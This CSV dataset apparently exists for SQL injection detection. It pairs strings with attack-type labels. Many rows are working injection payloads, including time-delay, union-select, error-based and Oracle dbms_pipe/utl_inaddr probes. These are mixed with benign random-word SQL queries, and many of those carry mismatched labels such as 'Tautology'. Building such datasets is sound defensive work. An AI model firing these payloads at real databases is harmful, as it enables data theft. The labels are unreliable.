knownpatterns,category
"""1""""   )    )     )   or sleep  (  5  )   and    (    (     (  """"hdis"""" like """"hdis""",Time-based Query
-4669  )   or 2452=1601#,Tautology
select   (  case when   (  1275  =  7674  )   then 1275 else 1275*  (  select 1275 from information_schema.character_sets  )   end  )  #,Alternate Encoding
"""1""""  )   where 2088  =  2088 union all select null,null,null,null--""",Union Query
"""1""""  )   where 1673=1673 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --""",Tautology
"""1'  )   as mmhe where 2142  =  2142 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --""",Alternate Encoding
1'   )    )    as xirr where 2425  =  2425,Tautology
SELECT * FROM angry WHERE foreign IN  ( SELECT smallest FROM separate ) ,Tautology
"""1%""""   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and    (    (     (  """"%""""  =  """"""",Tautology
1  )   where 4573  =  4573,Tautology
"""1'   )    )    union all select null,null--""",Union Query
"""  SELECT MOD ( 18, 4 ) ;""",Tautology
ORDER BY 14--,Tautology
SELECT * FROM consider WHERE    NOT recently = 'seen',Tautology
"""1""""   )    )    and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --""",Illegal/Logically incorrect query
"""1'||  (  select 'bccx' where 5881=  5881 and elt  (  1210=1210,sleep  (  5   )    )     )  ||'""",Time-based Query
""" select * from users where id=1 or @#"""",=1 union select 1,version  (    )   -- 1""",Union Query
SELECT * FROM  ( SELECT needle FROM root ) ,Tautology
"""1'||  (  select 'rttq' from dual where 7368  =  7368 or updatexml  (  1808,concat  (  0x2ex7171706a71,  (  select   (  elt  (  1808=1808   )    )     )  x717a767a71  )  ,8666   )    )   ||'""",Alternate Encoding
SELECT * FROM natural WHERE piece NOT LIKE 'roar%',Tautology
-9742  )   where 8409  =  8409 or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   \::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,Tautology
SELECT * FROM morning FETCH FIRST 50 PERCENT ROWS ONLY,Tautology
"""  SELECT shout AS pay, wish AS [breakfast]  FROM port""",Tautology
-9975 where 9760  =  9760 order by 1--,Tautology
"""1""""   )    )    or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )    )  ,5000000000  )  ,null  )  --""",Illegal/Logically incorrect query
1'   )    )    and 3526=1354,Tautology
create user name identified by pass123 temporary tablespace temp default tablespace users;,Tautology
SELECT * FROM proper WHERE    NOT built = 'well',Tautology
SELECT * FROM rhythm ORDER BY favorite,Tautology
 UPDATE prevent SET chicken = 'disease'WHERE practice = 'soft',Tautology
""" SELECT column_name ( s )  FROM couple,straight""",Tautology
SELECT * FROM label WHERE against = 'trade'  AND  ( heard = 'biggest' OR flow = 'simple' ) ,Tautology
SELECT * FROM seen WHERE listen BETWEEN '1996-07-01' AND '1996-07-31',Tautology
select sleep  (  5  )  --,Time-based Query
1'||  (  select 'ymre' where 8681=  8681,Tautology
"""1'||  (  select 'ftey' where 1363=1363 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484   )    )     )  x717a767a71x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   ||'""",Alternate Encoding
FROM  ( SELECT DISTINCT live FROM mainly ) ,Tautology
"""1'  )   as ljpy where 8270  =  8270 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173   )    )     )  x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --""",Illegal/Logically incorrect query
SELECT * FROM military FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM package,Tautology
1' where 3028  =  3028,Tautology
"""-5830  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570=1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  """,Alternate Encoding
"""1""""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #""",Time-based Query
"""1'   )    )     )   and make_set  (  9514  =  8668,8668  )   and    (    (     (  'sgjj' like 'sgjj""",Tautology
SELECT * FROM spring WHERE Price NOT BETWEEN 10 AND 20,Tautology
"""1'   )    )    as pstn where 6691=  6691 and 4241=  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241=  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --""",Alternate Encoding
"""-4606""""  )   as elek where 8261=  8261 or 8571=  8571--""",Tautology
"""1'+  (  select sged where 1181=1181 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4   )    )   +'""",Illegal/Logically incorrect query
select   (  case when   (  4205  =  9574  )   then 4205 else 1/  (  select 0  )   end  )  --,Tautology
SELECT MIN ( thick )  AS stomach FROM poor,Illegal/Logically incorrect query
SELECT * FROM worry WHERE engine BETWEEN 'struggle' AND 'activity',Tautology
"""1   )    )    as kgit where 1919=1919 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )    )  ,5000000000  )  ,null  )  --""",Illegal/Logically incorrect query
SELECT * FROM officer WHERE standard BETWEEN early09/01/1996influence AND relationship15/31/1996duty,Tautology
"""   SELECT fifth,spirit,travel,color,running     (  (  finger JOIN command ON mouse.bone =  house.entirely )   INNER JOIN lakeON Orders.go =  mysterious.consistID ) """,Tautology
SELECT tr.object_id FROM wp_term_relationships AS tr INNER JOIN wp_term_taxonomy AS tt ON tr.term_taxonomy_id  =  tt.term_taxonomy_id WHERE tt.taxonomy IN  ( 'nav_menu' )  AND tt.term_id IN  ( '715' )  ORDER BY tr.object_id ASC,Tautology
"""-7831""""   )    )    as krzi where 3798  =  3798 order by 1--""",Tautology
"""-8347%'  )   union all select 7643,7643,7643--""",Union Query
1'   )    )    rlike sleep  (  5  )   and    (    (   'iwct'  =  'iwct,Time-based Query
SELECT * FROM check WHERE locate NOT BETWEEN 'increase' AND 'experience',Tautology
"""1""""   )    )    as fjtv where 8904  =  8904""",Tautology
SELECT AVG ( hurt ) FROM diagram SELECT SUM ( blood ) ,Illegal/Logically incorrect query
SELECT nearby ( s )  FROM hay,Tautology
SELECT * FROM team WHERE corn = 'lose' LIMIT 3,Tautology
SELECT * FROM ordinary WHERE although  BETWEEN 10 AND 20,Tautology
1'  )   as fkpn where 1100=1100,Tautology
SELECT * FROM nervous WHERE sign = 'shade',Tautology
SELECT alike ( s ) FROM molecular INNER JOIN,Tautology
SELECT * FROM exclaimed 3,Tautology
SELECT * FROM bread ORDER BY temperature DESC,Tautology
"""1""""  )   union all select null,null,null,null,null,null#""",Union Query
select   (  case when   (  5704  =  4125  )   then 5704 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual--,Alternate Encoding
"""  SELECT whomID AS ID, careful AS darkness FROM mountain""",Tautology
SELECT COUNT ( method )  FROM fort,Illegal/Logically incorrect query
1'+  (  select mhfn where 2425  =  2425,Tautology
"""1   )    )     )   or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --""",Illegal/Logically incorrect query
"""1%'   )    )    union all select null,null#""",Union Query
SELECT * FROM swing WHERE explain BETWEEN '1996-07-01' AND '1996-07-31',Tautology
SELECT fairly ( s FROM volume RIGHT JOIN,Tautology
SELECT * FROM border WHERE gift IN  ( SELECT giving FROM own ) ,Tautology
"""1  )   as kzyb where 7023  =  7023 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --""",Illegal/Logically incorrect query
 (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and 'fdgq'  =  'fdgq,Time-based Query
"""1'   )    )    as hfra where 6500  =  6500 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --""",Illegal/Logically incorrect query
"""1  )   as zhvx where 3171=  3171 procedure analyse  (  extractvalue  (  5840,concat  (  0x5cx7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   x717a767a71   )    )     )  --""",Stored Procedure
SELECT MIN ( cannot )  AS herd FROM drew,Illegal/Logically incorrect query
"""-6815 where 7609  =  7609 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #""",Illegal/Logically incorrect query
 )   or sleep  (  __TIME__  )    =  ',Time-based Query
"""  UPDATE personal SET tomorrow =  'whose', City =  'partly' WHERE cloud =  fun""",Tautology
SELECT man ( s )  FROM lunch SELECT breathe ( s ) ,Tautology
"""1""""   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --""",Illegal/Logically incorrect query
SELECT * FROM lying WHERE tomorrow  BETWEEN 10 AND 20,Tautology
"""1   )    )    as vzgo where 6281=  6281 and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --""",Illegal/Logically incorrect query
SELECT shallow ( s )  FROM label LEFT JOIN,Tautology
SELECT * FROM mostly WHERE thought = 'got'  AND City = 'say',Tautology
"""-2718""""  )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  """"kbvd"""" like """"kbvd""",Tautology
"""select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou""",Tautology
"""1""""   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )    )  ,5000000000  )  ,null  )  --""",Illegal/Logically incorrect query
DELETE FROM hill WHERE aboard = 'opposite',Tautology
"""1'   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   'bmsa'  =  'bmsa""",Tautology
"""SELECT EXTRACT ( YEAR_MONTH FROM """"2017-06- 15 09:34:21"""" ) ;""",Tautology
SELECT * FROM  ( SELECT dance FROM grain ) ,Tautology
"""1%""""   )    )    and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #""",Alternate Encoding
"""-3194""""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  """"erua""""  =  """"erua""",Tautology
SELECT * FROM pink WHERE string BETWEEN 'land' AND 'bat',Tautology
""" SELECT column_name ( s )  FROM curious,bus""",Tautology
"""1%'   )    )    union all select null,null,null,null,null,null--""",Union Query
"""select count  (  *  )   from generate_series  (  1,5000000   )    )   +'""",Illegal/Logically incorrect query
1 where 9752  =  9752,Tautology
1%' waitfor delay '0:0:5'--,Time-based Query
"""1%'   )    )    union all select null,null,null,null,null,null,null,null--""",Union Query
SELECT COUNT ( leather ) FROM play,Illegal/Logically incorrect query
select   (  case when   (  5752  =  6036  )   then 1 else 5752*  (  select 5752 from master..sysdatabases  )   end  )  --,Tautology
"""1' in boolean mode  )   and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )    )  ,500000000  )  ,null  )  --""",Illegal/Logically incorrect query
"""   SELECT COUNT ( sea ) , gasoline FROM fine BY kept""",Illegal/Logically incorrect query
"""1 or extractvalue  (  1297,concat  (  0x5cx7171706a71,  (  select   (  elt  (  1297=1297   )    )     )  x717a767a71   )    )   """,Alternate Encoding
SELECT * FROM location WHERE stopped  BETWEEN 10 AND 20,Tautology
SELECT AVG ( inside ) FROM proper SELECT SUM ( settlers ) ,Illegal/Logically incorrect query
-8095'  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    ) ,Tautology
1  )   as ktfu where 2637  =  2637,Tautology
SELECT MIN ( plastic )  AS rocket FROM earlier,Illegal/Logically incorrect query
1'+  (  select 'upmd' where 3438  =  3438,Tautology
SELECT * FROM them ORDER BY anyway DESC,Tautology
SELECT * FROM either WHERE shinning = 'up'  OR ear = 'metal',Tautology
"""- 1593' or elt  (  7044  =  6125,6125  )   and 'zkuz'  =  'zkuz""",Tautology
SELECT * FROM accident WHERE likely BETWEEN 'hardly' AND 'command',Tautology
"""1""""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --""",Tautology
"""SELECT * FROM mountain WHERE recently BETWEEN """"tower"""" AND    """"sat""""""",Tautology
SELECT AVG ( general )  FROM one  SELECT SUM ( cold ) ,Illegal/Logically incorrect query
"""1"""" where 6179  =  6179""",Tautology
SELECT * FROM fruit WHERE NOT recall = 'wheel'  AND NOT breathing = 'team',Tautology
"""  SELECT chief AS half, sitting AS [bound]  FROM average""",Tautology
SELECT * FROM ProductsWHERE Price NOT BETWEEN 10 AND 20;,Tautology
SELECT * FROM five WHERE Price NOT BETWEEN 10 AND 20,Tautology
"""  SELECT wide,step,adjective FROM proud LEFT JOIN Orders ON maybe.kitchenID =  belt.customs ORDER BY vertical.snake""",Tautology
"""1'   )    )     )   or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270   )    )     )  x717a767a71x78   )    )   x   )    )    and    (    (     (  'fbsi' like 'fbsi""",Alternate Encoding
"""INSERT INTO loose  ( exercise, struck, chosen )  VALUES  ( 'yet', 'importance', 'tomorrow' )  """,Alternate Encoding
""" select * from users where id  =  '1' union select   (  \  )  ,@@VERSION -- 1'""",Union Query
"""1"""" and elt  (  1210=1210,sleep  (  5   )    )   """,Time-based Query
"""-4605""""  )   union all select 8542,8542,8542,8542,8542,8542,8542,8542--""",Union Query
"""-8699""""  )   union all select 8645,8645,8645,8645,8645,8645--""",Union Query
SELECT * FROM race WHERE opportunity LIKE '%front%',Tautology
select pg_sleep  (  5  )   and    (    (   'enpn' like 'enpn,Time-based Query
"""1%"""" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and """"%""""  =  """"""",Time-based Query
SELECT MIN ( green )  AS eager FROM crowd,Illegal/Logically incorrect query
"""1""""   )    )    union all select null,null#""",Union Query
"""1' and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'lwir' like 'lwir""",Illegal/Logically incorrect query
SELECT * FROM truth FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM hall,Tautology
"""org/?option  =  com_k2  <a href  =  """"http://corfopym""",Tautology
"""1"""" rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   """,Alternate Encoding
SELECT apple ( s )  FROM egg UNION ALL,Union Query
SELECT * FROM build WHERE fed NOT LIKE '[happen]%',Tautology
SELECT DISTINCT effort FROM spell,Tautology
SELECT * FROM easier WHERE soon = 'hunt'  OR minerals = 'from',Illegal/Logically incorrect query
1'+  (  select 'njee' where 4101=  4101 and 3090  =  7873  )  +',Tautology
"""select sleep  (  5  )   and    (    (   """"vzye""""  =  """"vzye""",Time-based Query
SELECT COUNT ( businessID ) FROM distant,Illegal/Logically incorrect query
"""  SELECT * FROM sharp WHERE bigger NOT IN  ( 'since', 'likely', 'through' )  """,Tautology
SELECT * FROM corner WHERE dot BETWEEN '1996-07-01' AND '1996-07-31',Tautology
SELECT AVG ( screen ) FROM labor SELECT SUM ( sound ) ,Illegal/Logically incorrect query
DELETE FROM examine,Illegal/Logically incorrect query
SELECT TOP 3 * FROM lying WHERE straw = 'decide',Tautology
SELECT lot ( s )  FROM escape,Tautology
SELECT TOP 50 PERCENT * FROM went SELECT * FROM that FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM ear,Tautology
"""call regexp_substring  (  repeat  (  right  (  char  (  3702  )    )  ,500000000  )  ,null  )   and 'hmqd'  =  'hmqd""",Illegal/Logically incorrect query
"""or 1=1 or """"""""  =  """,Tautology
